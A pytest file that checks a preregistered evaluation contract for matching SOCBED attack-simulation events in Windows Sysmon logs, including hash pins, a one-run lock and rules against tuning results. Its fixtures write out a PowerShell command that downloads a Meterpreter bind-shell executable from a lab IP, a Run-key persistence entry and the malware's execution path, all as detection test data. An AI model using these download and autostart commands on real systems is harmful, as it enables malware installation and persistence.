from __future__ import annotations

import hashlib
import importlib.util
import json
from pathlib import Path
from types import SimpleNamespace

import pytest
import yaml


ROOT = Path(__file__).resolve().parents[1]
CONTRACT = ROOT / "external_baseline" / "p2_35f_socbed_source_oracle_contract.yaml"
RUNNER = ROOT / "scripts" / "p2_35f_socbed_source_oracle.py"
P2_35E_RUNNER = ROOT / "scripts" / "p2_35e_socbed_timeline_one_pass.py"
P2_35E_RAW = ROOT / "external_baseline" / "results" / "p2_35e_e4561e3" / "result.json"


def _sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _load() -> dict:
    return yaml.safe_load(CONTRACT.read_text(encoding="utf-8"))


def _module():
    spec = importlib.util.spec_from_file_location("p2_35f_runner", RUNNER)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _event(event_id: str = "1", command_line: str = "", raw: dict | None = None):
    return SimpleNamespace(
        event_id=event_id,
        command_line=command_line,
        raw=raw or {},
        timestamp="2021-01-01T00:00:00Z",
        host="CLIENT1",
        source="Microsoft-Windows-Sysmon",
    )


def test_p2_35f_is_descriptive_post_p2_35e_not_blind_benchmark() -> None:
    row = _load()
    assert row["status"] == "PREREGISTERED_AFTER_P2_35E_COMPLETION"
    pred = row["predecessor"]
    assert pred["result_main_commit"] == "eb2c74768e7e3369fdc0329f273cb75ba0818992"
    assert pred["raw_result_sha256"] == _sha256(P2_35E_RAW)
    assert pred["raw_result_sha256"] == (
        "2ddefd866f335a7f6c5aca4951344373a95bacabab92f9de32e58263d0b26b17"
    )
    assert pred["p2_35e_must_remain_immutable"] is True

    exposure = row["prior_exposure"]
    assert exposure["p2_35e_selected_jsonl_was_decoded_before_this_contract"] is True
    assert exposure["p2_35e_aggregate_and_per_window_results_known_before_this_contract"] is True
    assert exposure["selected_jsonl_raw_event_predicate_match_scan_before_this_contract"] is False
    assert exposure["independent_blind_benchmark"] is False


def test_p2_35f_evaluates_exactly_three_source_derived_windows_actions() -> None:
    actions = _load()["oracle_actions"]
    evaluated = {
        name
        for name, cfg in actions.items()
        if cfg["disposition"] == "EVALUATED_SOURCE_DERIVED_ORACLE"
    }
    assert evaluated == {
        "misc_download_malware",
        "misc_set_autostart",
        "misc_execute_malware",
    }

    not_evaluated = set(actions) - evaluated
    assert not_evaluated == {
        "misc_sqlmap",
        "infect_email_exe",
        "c2_take_screenshot",
        "c2_exfiltration",
        "c2_mimikatz",
    }
    assert all(
        actions[name]["disposition"].startswith("NOT_EVALUATED_")
        for name in not_evaluated
    )


def test_p2_35f_source_and_collector_evidence_are_hash_pinned() -> None:
    row = _load()
    source = row["source"]
    assert source["dataset_archive"]["sha256"] == (
        "7eda65f08bbe6f274c1feff178ae132cfd0e8edbdf0a10ef08321259b6facc54"
    )
    assert source["selected_windows_member"]["sha256"] == (
        "d648be6ac0acd18a354e0e1b497800d9d41d2a511afe21308ca3c2a0b679064d"
    )
    assert source["timing_anchor_member"]["sha256"] == (
        "e843ab909b729709b893fedc4a81c00d8d0336ff745fe05febc52ba00e9668b7"
    )

    src = row["source_definition"]
    assert src["pinned_commit"] == "92ca444fac425a18141d90b09e3c9f8e7976dff4"
    assert src["attack_files"]["misc_download_malware"]["sha256"] == (
        "5cb8364636f569e7a0aad12baf8e81d106e7e013991e354b71ae080e99d9f788"
    )
    assert src["attack_files"]["misc_set_autostart"]["sha256"] == (
        "258ce78f953bdfeaefce32d0f697aa66cb81bccb78dc2c4c9c19aba88681bb72"
    )
    assert src["attack_files"]["misc_execute_malware"]["sha256"] == (
        "1c11bce03a01805b0dfd126ca7511345384ab3675389882f79f659919cf8bfee"
    )
    assert src["collector_files"]["winlogbeat"]["sha256"] == (
        "76d64893bdac246a0b436d018badf39a759d6a249ba4cd528d4e64c2c689776a"
    )
    assert src["collector_files"]["sysmon"]["sha256"] == (
        "e778f87a0c2c3bf3a074b82643d8411ba952b9912cb61086fa908b00b04d2403"
    )


def test_p2_35f_runner_and_p2_35e_dependency_are_byte_frozen() -> None:
    row = _load()
    assert row["analysis_id"] == "p2-35f-socbed-source-derived-oracle-v1"
    assert row["runner"]["sha256"] == _sha256(RUNNER)
    assert row["runner"]["sha256"] == (
        "6010438daef731096045fa4ebb789d09562d0b0a886e2c3ed98f3f965a57eae5"
    )
    assert row["runner"]["global_lock_file"] == (
        "external_baseline/locks/P2_35F_ONE_PASS.lock"
    )
    assert row["predecessor_runner"]["sha256"] == _sha256(P2_35E_RUNNER)
    assert row["predecessor_runner"]["sha256"] == (
        "bffd71419b11ad6e2ac1032ccfe904d7844e3a3a9f6159d6d9e7adeeeb83fca3"
    )

    module = _module()
    assert module.ANALYSIS_ID == "p2-35f-socbed-source-derived-oracle-v1"
    assert module.SCHEMA == "breachscope.p2_35f_socbed_source_oracle.v1"


def test_p2_35f_source_derived_predicates_match_only_frozen_shapes() -> None:
    module = _module()

    download = _event(
        command_line=(
            'cmd /C powershell -Command "Invoke-WebRequest '
            "'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile "
            "'C:\\Windows\\meterpreter_bind_tcp.exe'\""
        )
    )
    assert module.oracle_match("misc_download_malware", download) is True
    assert module.oracle_match(
        "misc_download_malware",
        _event(command_line="powershell Invoke-WebRequest http://example.invalid/a.exe"),
    ) is False

    autostart = _event(
        event_id="13",
        raw={
            "TargetObject": (
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                "\\Meterpreter Bind TCP"
            ),
            "Details": "meterpreter_bind_tcp.exe",
        },
    )
    assert module.oracle_match("misc_set_autostart", autostart) is True
    assert module.oracle_match(
        "misc_set_autostart",
        _event(event_id="13", raw={"TargetObject": "HKLM\\Software\\Other"}),
    ) is False

    execute = _event(
        event_id="1",
        raw={"Image": "C:\\Windows\\meterpreter_bind_tcp.exe"},
    )
    assert module.oracle_match("misc_execute_malware", execute) is True
    assert module.oracle_match(
        "misc_execute_malware",
        _event(event_id="1", raw={"Image": "C:\\Windows\\notepad.exe"}),
    ) is False


def test_p2_35f_global_lock_is_permanent_and_second_acquisition_fails(
    tmp_path: Path,
) -> None:
    module = _module()
    lock = tmp_path / "P2_35F_ONE_PASS.lock"
    module.acquire_global_lock(lock)
    payload = json.loads(lock.read_text(encoding="utf-8"))
    assert payload["analysis_id"] == "p2-35f-socbed-source-derived-oracle-v1"
    with pytest.raises(RuntimeError, match="already permanently locked"):
        module.acquire_global_lock(lock)


def test_p2_35f_protocol_and_claim_boundary_forbid_accuracy_inflation() -> None:
    row = _load()
    protocol = row["protocol"]
    assert protocol["contract_must_merge_before_selected_jsonl_oracle_scan"] is True
    assert protocol["duplicate_canonical_execution_allowed"] is False
    assert protocol["replace_result_for_better_outcome"] is False
    assert protocol["oracle_predicate_change_requires_new_analysis_id"] is True
    assert protocol["product_or_rule_change_before_measurement_allowed"] is False
    assert protocol["result_driven_tuning_before_canonical_measurement_allowed"] is False
    assert protocol["p2_35e_artifacts_must_remain_immutable"] is True

    claim = row["claim_boundary"]
    assert claim["evaluated_actions"] == "THREE_SOURCE_DERIVED_WINDOWS_ACTIONS_ONLY"
    assert claim["source_derived_oracle_event_binding"] == "NOT_YET_MEASURED"
    assert claim["attack_level_precision"] == "NOT_EVALUATED"
    assert claim["attack_level_recall"] == "NOT_EVALUATED"
    assert claim["event_level_precision"] == "NOT_EVALUATED"
    assert claim["event_level_recall"] == "NOT_EVALUATED"
    assert claim["eight_attack_recall"] == "NOT_EVALUATED"
    assert claim["independent_holdout_performance"] == "NOT_EVALUATED"
    assert claim["general_detection_accuracy"] == "NOT_CLAIMED"
    assert claim["statistical_benchmark"] is False
